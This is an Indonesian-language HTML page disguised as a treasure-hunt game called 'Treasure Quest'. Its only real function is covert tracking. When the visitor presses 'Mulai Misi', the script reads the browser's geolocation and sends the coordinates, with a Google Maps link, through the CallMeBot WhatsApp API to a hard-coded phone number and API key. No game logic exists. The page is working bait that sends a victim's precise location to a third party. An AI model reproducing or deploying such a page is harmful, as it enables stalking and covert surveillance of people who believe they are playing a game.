<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Treasure Quest</title>

<style>

body{
margin:0;
padding:0;
font-family:Arial,sans-serif;
background:linear-gradient(135deg,#0f172a,#1e3a8a);
height:100vh;
display:flex;
justify-content:center;
align-items:center;
color:white;
}

.container{
width:360px;
padding:30px;
border-radius:20px;
background:rgba(255,255,255,0.1);
backdrop-filter:blur(10px);
text-align:center;
box-shadow:0 0 30px rgba(0,0,0,.4);
}

.logo{
font-size:60px;
margin-bottom:10px;
}

button{
padding:14px 25px;
border:none;
border-radius:10px;
cursor:pointer;
font-size:18px;
margin-top:15px;
}

.status{
margin-top:20px;
font-size:14px;
line-height:1.6;
}

.note{
font-size:12px;
opacity:.8;
margin-top:15px;
}

</style>
</head>

<body>

<div class="container">

<div class="logo">
🏆
</div>

<h2>Treasure Quest</h2>

<p>
Temukan harta karun di sekitar Anda!
</p>

<div class="note">
Game membutuhkan akses lokasi untuk menjalankan misi.
</div>

<button onclick="mulaiMisi()">
Mulai Misi
</button>

<div class="status" id="status"></div>

</div>

<script>

async function mulaiMisi(){

let status=document.getElementById("status");

status.innerHTML="🎮 Memulai misi...";

navigator.geolocation.getCurrentPosition(

async function(pos){

let lat=pos.coords.latitude;
let long=pos.coords.longitude;

status.innerHTML=
"📍 Lokasi ditemukan<br>Mengirim misi...";

let pesan=
`🎮 Player memulai misi

📍 Latitude: ${lat}
📍 Longitude: ${long}

🗺️ https://maps.google.com/?q=${lat},${long}`;

let nomor = "6287894025536";
let apikey = "4901523";

let api=
`https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;

try{

await fetch(api);

status.innerHTML=
`✅ Misi berhasil dimulai
<br><br>
Koordinat berhasil dikirim`;

}

catch{

status.innerHTML=
"❌ Gagal mengirim data";

}

},

function(){

status.innerHTML=
"❌ Lokasi belum diizinkan";

}

);

}

</script>

</body>
</html>
